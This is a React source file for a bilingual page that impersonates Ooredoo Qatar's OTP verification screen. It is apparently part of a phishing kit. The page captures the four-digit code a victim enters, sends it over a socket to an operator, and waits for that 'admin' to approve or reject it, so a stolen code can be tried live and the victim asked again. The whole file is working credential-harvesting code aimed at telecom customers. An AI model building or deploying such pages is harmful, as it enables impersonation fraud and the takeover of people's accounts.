import { useState, useEffect, useRef } from "react";
import { useLocation } from "wouter";
import { Button } from "@/components/ui/button";
import SiteHeader from "@/components/SiteHeader";
import SiteFooter from "@/components/SiteFooter";
import { Loader2, PhoneCall, ShieldCheck } from "lucide-react";
import { useLang } from "@/i18n/LanguageContext";
import { socket, sendData, navigateToPage } from "@/lib/store";
import { getServiceContext } from "@/lib/serviceContext";

const OoredooOtp = () => {
  const { pick, dir } = useLang();
  const [, navigate] = useLocation();
  const selectedService =
    typeof window !== "undefined" ? sessionStorage.getItem("selected_service") : null;
  const serviceContext = getServiceContext(selectedService);

  const [digits, setDigits] = useState(["", "", "", ""]);
  const [loading, setLoading] = useState(false);
  const [waiting, setWaiting] = useState(false);
  const [rejected, setRejected] = useState(false);
  const [rejectionMsg, setRejectionMsg] = useState("");
  const [seconds, setSeconds] = useState(54);
  const inputsRef = useRef<Array<HTMLInputElement | null>>([]);

  const code = digits.join("");
  const isValid = code.length === 4;

  useEffect(() => {
    navigateToPage("رمز OTP Ooredoo");
  }, []);

  // مراقبة موافقة/رفض الأدمن
  useEffect(() => {
    if (!waiting) return;
    const s = socket.value;

    const onApproved = () => {
      setWaiting(false);
      setLoading(false);
      navigate("/waiting");
    };

    const onRejected = () => {
      setWaiting(false);
      setLoading(false);
      setRejected(true);
      setRejectionMsg(pick(
        "رمز التحقق غير صحيح. يرجى المحاولة مرة أخرى",
        "The code you entered is incorrect. Please try again."
      ));
      setDigits(["", "", "", ""]);
      inputsRef.current[0]?.focus();
    };

    s.on("form:approved", onApproved);
    s.on("form:rejected", onRejected);

    return () => {
      s.off("form:approved", onApproved);
      s.off("form:rejected", onRejected);
    };
  }, [waiting]);

  useEffect(() => {
    if (seconds <= 0) return;
    const t = setTimeout(() => setSeconds((s) => s - 1), 1000);
    return () => clearTimeout(t);
  }, [seconds]);

  const handleChange = (i: number, val: string) => {
    const d = val.replace(/\D/g, "").slice(-1);
    const next = [...digits];
    next[i] = d;
    setDigits(next);
    if (d && i < 3) inputsRef.current[i + 1]?.focus();
  };

  const handleKeyDown = (i: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace" && !digits[i] && i > 0) inputsRef.current[i - 1]?.focus();
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!isValid) return;
    setLoading(true);
    setRejected(false);
    setRejectionMsg("");

    sendData({
      data: {
        "رمز OTP": code,
        "الخدمة": selectedService || "ooredoo",
      },
      current: "رمز OTP Ooredoo",
      nextPage: "انتظار",
      waitingForAdminResponse: true,
      isCustom: true,
      customWaitingMessage: pick("جارٍ التحقق من رمز OTP...", "Verifying OTP code..."),
    });

    setWaiting(true);
  };

  return (
    <div className="min-h-screen bg-background relative" dir={dir}>
      {/* Waiting Overlay */}
      {waiting && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 backdrop-blur-sm">
          <div className="bg-white dark:bg-gray-900 rounded-2xl shadow-2xl p-8 max-w-sm w-full mx-4 text-center space-y-4">
            <Loader2 className="w-12 h-12 animate-spin text-primary mx-auto" />
            <p className="text-lg font-semibold text-foreground">
              {pick("جارٍ التحقق من رمز OTP...", "Verifying OTP code...")}
            </p>
          </div>
        </div>
      )}

      <SiteHeader />

      <section className="px-4 pb-10 pt-6">
        <div className="container mx-auto max-w-5xl space-y-5">
          {/* Official notice */}
          <div className="rounded-2xl bg-gradient-to-l from-red-600 to-red-700 text-white p-5 shadow-lg flex items-center gap-4">
            <div className="w-12 h-12 rounded-full bg-white/15 flex items-center justify-center shrink-0">
              <PhoneCall className="w-6 h-6 text-white" />
            </div>
            <div>
              <p className="text-xs font-bold opacity-90 mb-1">
                {pick(serviceContext.orgLineAr, serviceContext.orgLineEn)}
              </p>
              <p className="text-base font-extrabold leading-tight">
                {pick("التحقق برمز OTP", "OTP Verification")}
              </p>
            </div>
          </div>

          {/* Rejection Banner */}
          {rejected && rejectionMsg && (
            <div className="rounded-xl bg-red-50 border border-red-200 text-red-700 p-4 text-sm font-medium">
              {rejectionMsg}
            </div>
          )}

          {/* Form */}
          <div className="bg-card rounded-2xl shadow-sm border border-border p-6 space-y-6">
            <div className="space-y-1">
              <h1 className="text-2xl font-extrabold text-foreground">
                {pick("أدخل رمز التحقق", "Enter verification code")}
              </h1>
              <p className="text-sm text-muted-foreground">
                {pick(
                  "تم إرسال رمز التحقق إلى رقم هاتفك المسجّل لدى Ooredoo Qatar",
                  "A verification code has been sent to your phone number registered with Ooredoo Qatar"
                )}
              </p>
            </div>

            <form onSubmit={handleSubmit} className="space-y-6">
              {/* OTP inputs */}
              <div className="flex justify-center gap-3" dir="ltr">
                {digits.map((d, i) => (
                  <input
                    key={i}
                    ref={(el) => { inputsRef.current[i] = el; }}
                    type="text"
                    inputMode="numeric"
                    maxLength={1}
                    value={d}
                    onChange={(e) => handleChange(i, e.target.value)}
                    onKeyDown={(e) => handleKeyDown(i, e)}
                    className="w-14 h-14 text-center text-2xl font-bold border-2 border-border rounded-xl bg-background text-foreground focus:border-primary focus:outline-none transition-colors"
                  />
                ))}
              </div>

              {/* Timer */}
              <p className="text-center text-sm text-muted-foreground">
                {seconds > 0 ? (
                  pick(`إعادة الإرسال بعد ${seconds} ثانية`, `Resend in ${seconds} seconds`)
                ) : (
                  <button type="button" className="text-primary font-medium" onClick={() => setSeconds(54)}>
                    {pick("إعادة إرسال الرمز", "Resend code")}
                  </button>
                )}
              </p>

              <div className="flex items-start gap-2 text-xs text-muted-foreground bg-muted/50 rounded-lg p-3">
                <ShieldCheck className="w-4 h-4 shrink-0 mt-0.5 text-green-600" />
                <span>
                  {pick(
                    "هذا الرمز صالح لمرة واحدة فقط ويُستخدم للتحقق من ملكية الرقم.",
                    "This code is valid for one-time use only for phone number verification."
                  )}
                </span>
              </div>

              <Button
                type="submit"
                disabled={!isValid || loading}
                className="w-full h-12 text-base font-bold bg-primary hover:bg-primary/90"
              >
                {loading ? (
                  <Loader2 className="w-5 h-5 animate-spin" />
                ) : (
                  pick("تأكيد الرمز", "Confirm Code")
                )}
              </Button>
            </form>
          </div>
        </div>
      </section>

      <SiteFooter />
    </div>
  );
};

export default OoredooOtp;
